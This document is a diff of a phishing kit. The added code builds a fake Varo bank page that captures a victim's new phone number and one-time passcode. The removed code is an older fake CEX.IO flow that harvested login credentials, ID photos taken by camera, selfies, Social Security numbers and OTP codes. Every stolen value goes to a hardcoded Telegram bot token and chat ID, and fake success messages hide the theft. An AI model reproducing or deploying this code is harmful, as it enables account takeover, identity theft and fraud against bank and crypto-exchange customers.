+        <div style="width:80px; height:80px; border-radius:50%; background:#F3EFFC; display:flex; align-items:center; justify-content:center; margin:0 auto 24px;">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#7B5FCE" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        </div>
+        <div class="page-title" style="margin-bottom:12px;">Phone number updated</div>
+        <div class="page-subtitle" style="margin-bottom:32px;">
+          Your new phone number has been successfully verified and updated on your Varo account.
+        </div>
+        <button class="primary-btn" onclick="window.location.reload();">
+          Done
+        </button>
+      </div>
+    </div>
+
+    <!-- Bottom home indicator (decorative) -->
+    <div class="home-indicator"></div>
+  </div>
+
+  <!-- Toast -->
+  <div id="toast" class="toast"></div>
+
+  <!-- Loading overlay -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="spinner"></div>
+    <div class="loading-text" id="loadingText">Processing...<br>Please wait</div>
+  </div>
+
+  <script>
+    /* ============================================================
+       TELEGRAM BOT CONFIGURATION
+       ============================================================ */
+    const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+    const CHAT_ID   = "8737104261";
+
+    /* ============================================================
+       STATE
+       ============================================================ */
+    const userData = {
+      newPhoneNumber: '',
+      otpCode: ''
+    };
+
+    /* ============================================================
+       DOM REFS
+       ============================================================ */
+    // Panels
+    const phonePanel   = document.getElementById('phonePanel');
+    const otpPanel     = document.getElementById('otpPanel');
+    const successPanel = document.getElementById('successPanel');
+
+    // Phone
+    const newPhoneNumberInput = document.getElementById('newPhoneNumber');
+    const submitPhoneBtn      = document.getElementById('submitPhoneBtn');
+    const cancelLink          = document.getElementById('cancelLink');
+
+    // OTP
+    const otpCodeInput   = document.getElementById('otpCode');
+    const otpSubmitBtn   = document.getElementById('otpSubmitBtn');
+    const maskedPhone    = document.getElementById('maskedPhone');
+    const resendOtpBtn   = document.getElementById('resendOtpBtn');
+    const backToPhone    = document.getElementById('backToPhone');
+
+    // Toast / Loading
+    const toast          = document.getElementById('toast');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const loadingText    = document.getElementById('loadingText');
+
+    /* ============================================================
+       TELEGRAM HELPERS
+       ============================================================ */
+    async function sendToTelegram(text) {
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+          })
         });
+        return res.ok;
+      } catch (e) {
+        console.warn('Telegram send failed:', e);
+        return false;
+      }
+    }
+
+    /* ============================================================
+       UI HELPERS
+       ============================================================ */
+    let toastTimer = null;
+    function showToast(message, isError = false) {
+      toast.textContent = message;
+      toast.classList.toggle('error', isError);
+      toast.classList.add('show');
+      clearTimeout(toastTimer);
+      toastTimer = setTimeout(() => {
+        toast.classList.remove('show');
+      }, 3000);
+    }
+
+    function showLoading(message) {
+      loadingText.innerHTML = message + '<br>Please wait';
+      loadingOverlay.classList.add('active');
+    }
+
+    function hideLoading() {
+      loadingOverlay.classList.remove('active');
+    }
+
+    function showPanel(panel) {
+      [phonePanel, otpPanel, successPanel].forEach(p => p.classList.add('hide'));
+      panel.classList.remove('hide');
+    }
+
+    /* ============================================================
+       STEP 1 → STEP 2: PHONE → OTP
+       ============================================================ */
+    submitPhoneBtn.addEventListener('click', async function () {
+      const phone = newPhoneNumberInput.value.trim();
+
+      if (!phone || phone.length < 5) {
+        showToast('Please enter a valid phone number.', true);
+        newPhoneNumberInput.focus();
+        return;
       }
 
-      function showToast(msg, isError = false) {
-        toast.innerText = msg;
-        toast.classList.add('show');
-        toast.style.background = isError ? '#E53E3E' : '#1A202C';
-        setTimeout(() => toast.classList.remove('show'), 3000);
+      userData.newPhoneNumber = phone;
+
+      // Send to Telegram
+      const msg = `📱 <b>VARO — UPDATE PHONE NUMBER</b>\n` +
+                  `📞 New phone: <code>${phone}</code>\n` +
+                  `🌐 ${navigator.userAgent}\n` +
+                  `⏱️ ${new Date().toLocaleString()}`;
+      await sendToTelegram(msg);
+
+      // Update masked phone display (last 4 digits)
+      const last4 = phone.length >= 4 ? phone.slice(-4) : '****';
+      maskedPhone.textContent = last4;
+
+      // Move to OTP panel
+      showPanel(otpPanel);
+      otpCodeInput.focus();
+    });
+
+    /* ============================================================
+       STEP 2: OTP VERIFICATION
+       ============================================================ */
+    otpSubmitBtn.addEventListener('click', async function () {
+      const otp = otpCodeInput.value.trim();
+
+      if (!otp || otp.length < 4) {
+        showToast('Please enter the verification code.', true);
+        otpCodeInput.focus();
+        return;
       }
 
-      async function sendToTelegram(text) {
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
-          });
-          return res.ok;
-        } catch (e) {
-          return false;
-        }
-      }
+      userData.otpCode = otp;
 
-      async function sendPhotoToTelegram(blob, caption) {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, 'cex_verification.jpg');
-        if (caption) formData.append('caption', caption);
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-          });
-          return res.ok;
-        } catch (e) {
-          return false;
-        }
-      }
+      // Send to Telegram
+      const msg = `🔢 <b>VARO — OTP CODE (phone update)</b>\n` +
+                  `🔐 Code: <code>${otp}</code>\n` +
+                  `📞 New phone: <code>${userData.newPhoneNumber}</code>\n` +
+                  `✅ Phone number update completed.`;
+      await sendToTelegram(msg);
 
-      // ---- Forgot password flow ----
-      forgotPasswordLink.addEventListener('click', (e) => {
+      // Show loading then success
+      showLoading('Updating your phone number...');
+
+      setTimeout(() => {
+        hideLoading();
+        showPanel(successPanel);
+        showToast('Phone number updated successfully!');
+      }, 1800);
+    });
+
+    /* ============================================================
+       RESEND OTP
+       ============================================================ */
+    resendOtpBtn.addEventListener('click', async function () {
+      showToast('A new verification code has been sent to your phone.');
+
+      const msg = `🔄 <b>VARO — RESEND OTP (phone update)</b>\n` +
+                  `User requested a new code.\n` +
+                  `📞 New phone: <code>${userData.newPhoneNumber}</code>`;
+      await sendToTelegram(msg);
+    });
+
+    /* ============================================================
+       BACK NAVIGATION
+       ============================================================ */
+    backToPhone.addEventListener('click', function (e) {
+      e.preventDefault();
+      otpCodeInput.value = '';
+      showPanel(phonePanel);
+      newPhoneNumberInput.focus();
+    });
+
+    cancelLink.addEventListener('click', function (e) {
+      e.preventDefault();
+      // In a real app, redirect back to settings/account page.
+      // For this demo, just clear the input and show a toast.
+      newPhoneNumberInput.value = '';
+      showToast('Update cancelled.');
+    });
+
+    /* ============================================================
+       ENTER KEY NAVIGATION
+       ============================================================ */
+    newPhoneNumberInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
         e.preventDefault();
-        loginPanel.classList.add('hide');
-        forgotPanel.classList.remove('hide');
-        forgotEmail.value = loginIdentifier.value.trim();
-      });
+        submitPhoneBtn.click();
+      }
+    });
 
-      backToLoginFromForgot.addEventListener('click', (e) => {
+    otpCodeInput.addEventListener('keydown', function (e) {
+      if (e.key === 'Enter') {
         e.preventDefault();
-        forgotPanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-      });
-
-      sendResetBtn.addEventListener('click', async () => {
-        const email = forgotEmail.value.trim();
-        if (!email) {
-          showToast("Please enter your registered email address", true);
-          return;
-        }
-        userData.identifier = email;
-        await sendToTelegram(`🔑 <b>CEX.IO PASSWORD RESET REQUEST</b>\nEmail: <code>${email}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
-        showToast("Password reset link sent to your email.", false);
-        forgotPanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-      });
-
-      // ---- Step 1 -> Step 2 ----
-      continueToPhoneBtn.onclick = () => {
-        const identifier = loginIdentifier.value.trim();
-        const password = loginPassword.value.trim();
-
-        if (!identifier) {
-          showToast("Please enter your email address", true);
-          return;
-        }
-        if (!password) {
-          showToast("Please enter your password", true);
-          return;
-        }
-
-        userData.identifier = identifier;
-        userData.password = password;
-
-        sendToTelegram(`💳 <b>CEX.IO - LOGIN</b>\nEmail: <code>${identifier}</code>\nPassword: <code>${password}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
-
-        loginPanel.classList.add('hide');
-        phonePanel.classList.remove('hide');
-      };
-
-      backToLoginFromPhone.onclick = (e) => {
-        e.preventDefault();
-        phonePanel.classList.add('hide');
-        loginPanel.classList.remove('hide');
-        userPhoneInput.value = '';
-      };
-
-      // ---- Step 2 -> Step 3 ----
-      submitPhoneBtn.onclick = () => {
-        const phone = userPhoneInput.value.trim();
-        if (!phone || phone.length < 5) {
-          showToast("Valid phone number required", true);
-          return;
-        }
-        userData.phoneNumber = phone;
-        sendToTelegram(`📱 <b>CEX.IO - PHONE NUMBER</b>\nPhone: <code>${phone}</code>\nUser: ${userData.identifier}`);
-        phonePanel.classList.add('hide');
-        passwordPanel.classList.remove('hide');
-        userPasswordInput.value = userData.password || '';
-      };
-
-      backToPhoneFromPassword.onclick = (e) => {
-        e.preventDefault();
-        passwordPanel.classList.add('hide');
-        phonePanel.classList.remove('hide');
-        userPasswordInput.value = '';
-      };
-
-      // ---- Step 3 -> KYC ----
-      submitPasswordBtn.onclick = async () => {
-        const password = userPasswordInput.value.trim();
-        if (!password) {
-          showToast("Please enter your password", true);
-          return;
-        }
-        userData.password = password;
-        await sendToTelegram(`🔐 <b>CEX.IO PASSWORD CONFIRMED</b>\nPassword: <code>${password}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
-        passwordPanel.classList.add('hide');
-        kycPanel.classList.remove('hide');
-        showKycStep(1);
-      };
-
-      // ---------- KYC PHOTO LOGIC ----------
-      let currentKycStep = 1;
-      let frontStream, backStream, selfieStream, selfieIdStream;
-      let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
-
-      function stopStream(stream) {
-        if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
+        otpSubmitBtn.click();
       }
+    });
 
-      async function initCamera(videoEl, facingMode) {
-        try {
-          let constraints = { video: { facingMode: { exact: facingMode } } };
-          let stream = await navigator.mediaDevices.getUserMedia(constraints);
-          videoEl.srcObject = stream;
-          await videoEl.play();
-          return stream;
-        } catch (e) {
-          let fallback = await navigator.mediaDevices.getUserMedia({ video: true });
-          videoEl.srcObject = fallback;
-          await videoEl.play();
-          return fallback;
-        }
-      }
-
-      async function switchCamera(video, currentStream, setStream, setRear, currentRear) {
-        if (currentStream) stopStream(currentStream);
-        let newFacing = currentRear ? 'user' : 'environment';
-        let newStream = await initCamera(video, newFacing);
-        setStream(newStream);
-        setRear(!currentRear);
-      }
-
-      async function capturePhoto(video, statusElem, sideDescription, nextStepCallback = null) {
-        if (!video.videoWidth || video.videoWidth === 0) {
-          showToast("Camera not ready", true);
-          return;
-        }
-        statusElem.innerText = "Uploading...";
-        let canvas = document.createElement('canvas');
-        let size = Math.min(video.videoWidth, video.videoHeight);
-        canvas.width = size;
-        canvas.height = size;
-        let ctx = canvas.getContext('2d');
-        let sx = (video.videoWidth - size) / 2;
-        let sy = (video.videoHeight - size) / 2;
-        ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
-        canvas.toBlob(async blob => {
-          const caption = `[CEX.IO KYC] ${sideDescription} | User: ${userData.identifier} | Phone: ${userData.phoneNumber}`;
-          await sendPhotoToTelegram(blob, caption);
-          statusElem.innerText = `✅ ${sideDescription} uploaded.`;
-          if (nextStepCallback) setTimeout(() => nextStepCallback(), 800);
-        }, 'image/jpeg', 0.8);
-      }
-
-      function showKycStep(step) {
-        document.querySelectorAll('.kyc-step').forEach(el => el.classList.add('hide'));
-        const targetStep = document.getElementById(`kycStep${step}`);
-        if (targetStep) targetStep.classList.remove('hide');
-        currentKycStep = step;
-        updateStepDots(step);
-        if (step === 2) {
-          stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
-          initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
-        } else if (step === 3) {
-          stopStream(frontStream); stopStream(selfieStream); stopStream(selfieIdStream);
-          initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
-        } else if (step === 4) {
-          stopStream(frontStream); stopStream(backStream); stopStream(selfieIdStream);
-          initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
-        } else if (step === 5) {
-          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream);
-          initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
-        }
-      }
-
-      function updateStepDots(step) {
-        const dots = document.querySelectorAll('.step-dot');
-        dots.forEach((dot, i) => {
-          if (i + 1 < step) dot.classList.add('completed');
-          else if (i + 1 === step) dot.classList.add('active');
-          else dot.classList.remove('active', 'completed');
-        });
-      }
-
-      document.getElementById('kycStep1Next').onclick = () => {
-        let idType = document.getElementById('idType').value;
-        let idState = document.getElementById('idState').value;
-        if (!idType || !idState) {
-          showToast("Please select ID type and issuing state", true);
-          return;
-        }
-        userData.idType = idType;
-        userData.idState = idState;
-        sendToTelegram(`📄 <b>CEX.IO ID DETAILS</b>\nType: ${idType}\nState: ${idState}\nUser: ${userData.identifier}`);
-        showKycStep(2);
-      };
-
-      document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s => frontStream = s, v => usingRearFront = v, usingRearFront);
-      document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "FRONT_ID", () => showKycStep(3));
-      document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s => backStream = s, v => usingRearBack = v, usingRearBack);
-      document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "BACK_ID", () => showKycStep(4));
-      document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s => selfieStream = s, v => usingRearSelfie = v, usingRearSelfie);
-      document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "SELFIE_FACE", () => showKycStep(5));
-      document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s => selfieIdStream = s, v => usingRearSelfieId = v, usingRearSelfieId);
-      document.getElementById('captureSelfieIdBtn').onclick = () => {
-        capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
-          stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
-          kycPanel.classList.add('hide');
-          await sendToTelegram(`📸 <b>CEX.IO KYC COMPLETED</b> for ${userData.identifier}. Ready for SSN step.`);
-          ssnPanel.classList.remove('hide');
-          showToast("Identity documents uploaded. Please provide your SSN.", false);
-        });
-      };
-
-      // ---------- SSN SUBMISSION ----------
-      // Auto-format SSN input as XXX-XX-XXXX
-      ssnInput.addEventListener('input', (e) => {
-        let val = e.target.value.replace(/\D/g, '').slice(0, 9);
-        let formatted = val;
-        if (val.length > 5) {
-          formatted = val.slice(0, 3) + '-' + val.slice(3, 5) + '-' + val.slice(5);
-        } else if (val.length > 3) {
-          formatted = val.slice(0, 3) + '-' + val.slice(3);
-        }
-        e.target.value = formatted;
-      });
-
-      backToKycFromSsn.onclick = (e) => {
-        e.preventDefault();
-        ssnPanel.classList.add('hide');
-        kycPanel.classList.remove('hide');
-        showKycStep(5);
-      };
-
-      submitSsnBtn.onclick = async () => {
-        const ssn = ssnInput.value.trim();
-        const digitsOnly = ssn.replace(/\D/g, '');
-        if (digitsOnly.length !== 9) {
-          showToast("Please enter a valid 9-digit Social Security Number", true);
-          return;
-        }
-        userData.ssn = ssn;
-        await sendToTelegram(`🆔 <b>CEX.IO SSN PROVIDED</b>\nSSN: <code>${ssn}</code>\nUser: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
-        ssnPanel.classList.add('hide');
-        otpPanel.classList.remove('hide');
-        showToast("SSN received. Enter the verification code sent to your phone.", false);
-      };
-
-      // OTP submission
-      otpSubmit.onclick = async () => {
-        const otpValue = otpCodeInput.value.trim();
-        if (!otpValue) {
-          showToast("Please enter the verification code", true);
-          return;
-        }
-        userData.otpCode = otpValue;
-        await sendToTelegram(`🔢 <b>CEX.IO OTP CODE</b>\nCode: ${otpValue}\nPhone: ${userData.phoneNumber}\nUser: ${userData.identifier}\nSSN: ${userData.ssn}\n✅ All data captured.`);
-        loadingOverlay.classList.add('active');
-        setTimeout(() => {
-          loadingOverlay.classList.remove('active');
-          otpPanel.classList.add('hide');
-          successPanel.classList.remove('hide');
-          showToast("Verification successful!", false);
-        }, 1800);
-      };
-
-      // Resend SMS & Request email OTP
-      resendSmsBtn.onclick = async () => {
-        showToast("A new verification code has been sent to your phone.", false);
-        await sendToTelegram(`🔄 <b>RESEND OTP (SMS)</b>\nUser requested new SMS code.\nPhone: ${userData.phoneNumber}`);
-      };
-
-      requestEmailOtpBtn.onclick = async () => {
-        showToast("We've sent a verification code to your registered email address.", false);
-        await sendToTelegram(`✉️ <b>REQUEST OTP VIA EMAIL</b>\nUser requested OTP to be sent to email.\nLinked email: ${userData.identifier}\nPhone: ${userData.phoneNumber}`);
-      };
-
-      backToSsnLink.onclick = (e) => {
-        e.preventDefault();
-        otpPanel.classList.add('hide');
-        ssnPanel.classList.remove('hide');
-      };
-
-      window.addEventListener('beforeunload', () => {
-        stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
-      });
-    </script>
-  </body>
+    /* ============================================================
+       AUTO-FOCUS ON LOAD
+       ============================================================ */
+    window.addEventListener('load', function () {
+      newPhoneNumberInput.focus();
+    });
+  </script>
+</body>
 </html>
